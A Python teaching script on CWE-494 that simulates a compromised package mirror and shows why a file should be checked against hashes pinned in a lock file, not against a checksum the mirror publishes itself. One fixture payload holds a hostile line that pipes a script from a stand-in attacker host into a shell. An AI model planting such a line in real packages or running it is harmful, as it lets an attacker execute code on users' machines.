"""CWE-494: download without integrity check — verify against hashes pinned in the lock

https://cwe.mitre.org/data/definitions/494.html

A checksum fetched from the same server as the file proves nothing: whoever
can swap the wheel on a compromised mirror can swap its .sha256 too. The hash
has to come from somewhere the attacker cannot write, which in practice is
the lock file reviewed and committed in your repository. This is what
`pip install --require-hashes -r requirements.txt` enforces.

v2 follows pip more closely. A requirement may list several hashes (one per
wheel plus the sdist), and any one of them may match. Only sha256, sha384 and
sha512 are accepted, every requirement must be pinned with ==, project names
are compared after PEP 503 normalisation, files are streamed from disk with
hashlib.file_digest, and verification is all-or-nothing: one bad file means
nothing is installed, instead of leaving a half-upgraded environment.
"""

import hashlib
import hmac
import re
import tempfile
from pathlib import Path

LOCK = """\
# generated by pip-compile --generate-hashes
requests==2.32.3 \\
    --hash=sha256:0057db93a25665593a45515c4ccf6a1ebe55e72049b77ba344d0cc21b3d1f135 \\
    --hash=sha256:4418a891e4af0c52ed149a47fcdba3a4109b7ab831a654bfc0e6b40cb8037960
idna==3.10 \\
    --hash=sha512:e72035b7d08fba1d6c890ab8a1a320ebac8fb5b411fe358f7caa676c7419c4cd0961f7532a0beceb791c52d7d4f8c42d932012a66c8d990d8d70b5ac910a9e8b
urllib3==2.2.3 \\
    --hash=sha256:9dbe87d4c6bd1e2f7300cc1445079ed61eeda3ae258b093aa1ecc959b219f967
certifi==2024.8.30 \\
    --hash=md5:085ddb075942148bb694ab421e03d3ea
charset-normalizer>=3.3 \\
    --hash=sha256:7501c5bdbe09783421b9b73ef5549044a2ae6374963ce1b5061b3671ffc286cf
"""
ALLOWED = {"sha256", "sha384", "sha512"}  # the algorithms pip accepts for --hash


def artifact(filename: str) -> bytes:
    return f"fixture artifact {filename}\n".encode()


def build_mirror() -> dict[str, tuple[bytes, str]]:
    """filename -> (bytes served, sha256 the mirror publishes next to it)."""
    names = ["requests-2.32.3.tar.gz", "idna-3.10-py3-none-any.whl",
             "urllib3-2.2.3-py3-none-any.whl", "certifi-2024.8.30-py3-none-any.whl",
             "charset_normalizer-3.4.0-py3-none-any.whl", "colorama-0.4.6-py2.py3-none-any.whl"]
    mirror = {}
    for name in names:
        data = artifact(name)
        if name.startswith("urllib3"):  # compromised mirror: payload and checksum both replaced
            data += b"import os; os.system('curl -s https://evil.example/x | sh')\n"
        mirror[name] = (data, hashlib.sha256(data).hexdigest())
    return mirror


def normalize(name: str) -> str:
    return re.sub(r"[-_.]+", "-", name).lower()  # PEP 503


def parse_lock(text: str) -> tuple[dict[str, tuple[str, dict[str, set[str]]]], list[str]]:
    lock, problems = {}, []
    for line in re.sub(r"\\\n", " ", text).splitlines():
        line = line.split("#", 1)[0].strip()
        if not line:
            continue
        req, *opts = line.split()
        m = re.fullmatch(r"([A-Za-z0-9._-]+)==([^=*,;]+)", req)
        if not m:
            problems.append(f"lock: {req} is not pinned with ==")
            continue
        hashes: dict[str, set[str]] = {}
        for opt in opts:
            alg, _, digest = opt.removeprefix("--hash=").partition(":")
            if alg not in ALLOWED:
                problems.append(f"lock: {m[1]} uses --hash={alg}, allowed: {', '.join(sorted(ALLOWED))}")
                continue
            hashes.setdefault(alg, set()).add(digest)
        if not hashes:
            problems.append(f"lock: {m[1]} has no usable hash")
            continue
        lock[normalize(m[1])] = (m[2], hashes)
    return lock, problems


def project_of(filename: str) -> tuple[str, str]:
    stem = filename.removesuffix(".tar.gz").removesuffix(".whl")
    name, version = stem.split("-")[:2]
    return normalize(name), version


def noncompliant_install(mirror) -> list[str]:
    return [f"{name}: installed" for name, (data, published) in mirror.items()
            if hashlib.sha256(data).hexdigest() == published]  # the mirror vouching for itself


def compliant_install(downloads: Path, lock_text: str) -> list[str]:
    lock, problems = parse_lock(lock_text)
    verified = []
    for path in sorted(downloads.iterdir()):
        project, version = project_of(path.name)
        if project not in lock:
            problems.append(f"{path.name}: not in lock (no hash pinned)")
            continue
        pinned, hashes = lock[project]
        if version != pinned:
            problems.append(f"{path.name}: lock pins {pinned}")
            continue
        with path.open("rb") as fh:
            ok = False
            for alg, digests in hashes.items():
                fh.seek(0)
                actual = hashlib.file_digest(fh, alg).hexdigest()
                ok |= any(hmac.compare_digest(actual, d) for d in digests)
        (verified if ok else problems).append(
            f"{path.name}: {'verified' if ok else 'hash does not match any pinned hash'}")
    if problems:
        return problems + [f"aborted: {len(problems)} problem(s), nothing installed"]
    return verified + [f"installed {len(verified)} files"]


def main() -> None:
    mirror = build_mirror()
    for line in noncompliant_install(mirror):
        print(f"noncompliant: {line}")
    with tempfile.TemporaryDirectory() as tmp:
        downloads = Path(tmp)
        for name, (data, _) in mirror.items():
            (downloads / name).write_bytes(data)
        for line in compliant_install(downloads, LOCK):
            print(f"compliant:    {line}")

        # After review: fix the lock, add colorama, fetch urllib3 from a clean mirror.
        fixed = (LOCK.replace("md5:085ddb075942148bb694ab421e03d3ea",
                              "sha256:e7101a64a07308f4d75686c90c87266dc11cec4c4f3ba89037ab69878e526b56")
                 .replace("charset-normalizer>=3.3", "charset-normalizer==3.4.0")
                 + "colorama==0.4.6 \\\n"
                 + "    --hash=sha256:415d68e9d2e9e0be4cf6c0a2f2b5b62c97181a21d770158f99ac9013dc3dd7c2\n")
        (downloads / "urllib3-2.2.3-py3-none-any.whl").write_bytes(artifact("urllib3-2.2.3-py3-none-any.whl"))
        print()
        for line in compliant_install(downloads, fixed):
            print(f"compliant:    {line}")


if __name__ == "__main__":
    main()

